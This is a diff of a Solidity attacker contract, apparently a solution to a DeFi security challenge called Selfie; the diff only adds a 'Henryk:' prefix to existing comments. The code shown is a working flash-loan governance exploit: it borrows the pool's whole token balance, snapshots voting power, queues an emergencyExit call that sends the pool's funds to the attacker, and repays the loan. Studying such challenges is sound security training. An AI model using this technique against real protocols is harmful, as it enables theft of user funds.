@@ -33,7 +33,7 @@ contract SelfieAttacker is IERC3156FlashBorrower {
     ) {
         pool = IPool(_poolAddress);
         governance = IGovernance(_governanceAddress);
-        // We only store the token so we can get the balance on attack()
+        // Henryk: We only store the token so we can get the balance on attack()
         // During the flashLoan itself we will use the token_address passed in
         // But they both will be the same thing
         token = IToken(_tokenAddress);
@@ -41,7 +41,7 @@ contract SelfieAttacker is IERC3156FlashBorrower {
    }
 
     function attack() external {
-        // We only need 50% of the tokens to have the governance rights but
+        // Henryk: We only need 50% of the tokens to have the governance rights but
         // we are just taking them all out in the flash loan for fun
         uint balance = token.balanceOf(address(pool));
         pool.flashLoan(this, address(token), balance, bytes(""));
@@ -57,21 +57,21 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         bytes calldata) external returns (bytes32) {
             console.log("entered the onFlashLoan method.");
 
-            // The governance token looks at the last snapshot time to see the total supply
+            // Henryk: The governance token looks at the last snapshot time to see the total supply
             // when determining if the person enqueuing the action passes the
             // governance check 
             IToken(token_address).snapshot();
 
-            // Queue the action that will be later be executed by the governance smart contract 
+            // Henryk: Queue the action that will be later be executed by the governance smart contract 
             // outside of this smart contact
             governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));
 
-            // The pool is going to do the transfer itself so we need to do the approve here
+            // Henryk: The pool is going to do the transfer itself so we need to do the approve here
             // so the pool smart contact can retrieve the same amount back that was
             // loaned out
             IToken(token_address).approve(address(pool), amount);
 
-            // This is just the return type that is expected by the pool
+            // Henryk: This is just the return type that is expected by the pool
             return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
